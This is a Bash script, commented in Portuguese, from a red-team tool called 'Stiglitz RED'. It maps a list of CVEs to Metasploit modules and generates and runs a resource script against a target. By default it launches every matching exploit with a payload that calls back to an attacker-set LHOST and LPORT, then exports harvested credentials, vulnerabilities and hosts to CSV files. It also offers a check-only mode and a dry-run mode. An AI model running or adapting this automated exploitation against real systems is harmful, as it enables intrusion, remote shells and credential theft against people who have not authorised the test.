#!/usr/bin/env bash
# Stiglitz RED — Fase Metasploit
# Roda APENAS módulos para CVEs identificados — sem scanners genéricos.
# Chamado por: stiglitz_red.sh run_services()

set -uo pipefail

_msf_modules_for_cve() {
    local cve="$1"
    msfconsole -q -x "search type:exploit,auxiliary cves:${cve}; exit" 2>/dev/null \
        | grep -E '^\s+[0-9]+\s+' \
        | awk '{print $2}' \
        | grep -v '^$'
}

_generate_rc() {
    local rc_file="$1" target="$2" lhost="$3" lport="$4" payload="$5"
    shift 5; local modules=("$@")

    # Modo não intrusivo (production / payload NONE): só `check`, sem disparar
    # exploits nem módulos auxiliares — apenas confirma se o alvo é vulnerável.
    local check_only=false
    [ "$payload" = "NONE" ] && check_only=true

    {
        echo "# Stiglitz RED — Resource Script gerado automaticamente"
        echo "# Alvo: $target | $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
        echo "# Modo: $([ "$check_only" = true ] && echo 'CHECK-ONLY (não intrusivo)' || echo 'EXPLOIT')"
        echo "workspace -a stiglitz_red_$$"
        echo ""
        for mod in "${modules[@]}"; do
            if [ "$check_only" = true ]; then
                # Em check-only só exploits suportam `check`; auxiliares são pulados
                [[ "$mod" == exploit/* ]] || continue
                echo "use $mod"
                echo "set RHOSTS $target"
                echo "set ConnectTimeout 10"
                echo "set VERBOSE false"
                echo "check"
                echo ""
                continue
            fi
            echo "use $mod"
            echo "set RHOSTS $target"
            if [[ "$mod" == exploit/* ]]; then
                echo "set PAYLOAD $payload"
                echo "set LHOST $lhost"
                echo "set LPORT $lport"
            fi
            echo "set ConnectTimeout 10"
            echo "set VERBOSE false"
            echo "run -j"
            echo "sleep 5"
            echo ""
        done
        echo "jobs -l"
        echo "sleep 30"
        echo "creds"
        echo "vulns"
        echo "exit -y"
    } > "$rc_file"
}

# ── Runner principal ──────────────────────────────────────────────────────────
# Assinatura: run_msf_phase(cves_file, target, lhost, lport,
#                            payload, msf_dir, timeout)
run_msf_phase() {
    local cves_file="$1"
    local target="$2"
    local lhost="$3"
    local lport="$4"
    local payload="$5"
    local msf_dir="$6"
    local timeout="${7:-600}"

    mkdir -p "$msf_dir"

    local cve_count; cve_count=$(wc -l < "$cves_file")
    echo "[msf] Buscando módulos para $cve_count CVE(s)..."

    local all_modules=()
    while IFS= read -r cve; do
        [ -z "$cve" ] && continue
        local mods
        mapfile -t mods < <(_msf_modules_for_cve "$cve")
        if [ "${#mods[@]}" -gt 0 ]; then
            echo "[msf]   $cve → ${#mods[@]} módulo(s)"
            all_modules+=("${mods[@]}")
        else
            echo "[msf]   $cve → sem módulos disponíveis"
        fi
    done < "$cves_file"

    mapfile -t all_modules < <(printf '%s\n' "${all_modules[@]:-}" | sort -u | grep -v '^$')

    if [ "${#all_modules[@]}" -eq 0 ]; then
        echo "[msf] Nenhum módulo MSF para os CVEs encontrados"
        return 0
    fi

    echo "[msf] ${#all_modules[@]} módulo(s) único(s)"

    if [ "${DRY_RUN:-false}" = true ]; then
        printf '[msf] [DRY-RUN] módulo: %s\n' "${all_modules[@]}"
        return 0
    fi

    local rc_file="$msf_dir/stiglitz_red.rc"
    local log_file="$msf_dir/msf_output.log"

    _generate_rc "$rc_file" "$target" "$lhost" "$lport" "$payload" "${all_modules[@]}"
    echo "[msf] Resource script: $rc_file"

    timeout "$timeout" msfconsole -q -r "$rc_file" 2>&1 | tee "$log_file" || true

    # Exportar resultados
    msfconsole -q -x "
workspace stiglitz_red_$$
creds -o $msf_dir/creds.csv
vulns -o $msf_dir/vulns.csv
hosts -o $msf_dir/hosts.csv
exit -y" 2>/dev/null || true

    local cred_count vuln_count
    cred_count=$(tail -n +2 "$msf_dir/creds.csv" 2>/dev/null | grep -c .); cred_count=${cred_count:-0}
    vuln_count=$(tail -n +2 "$msf_dir/vulns.csv" 2>/dev/null | grep -c .); vuln_count=${vuln_count:-0}
    echo "[msf] Concluído: $vuln_count vuln(s), $cred_count credencial(is)"
}
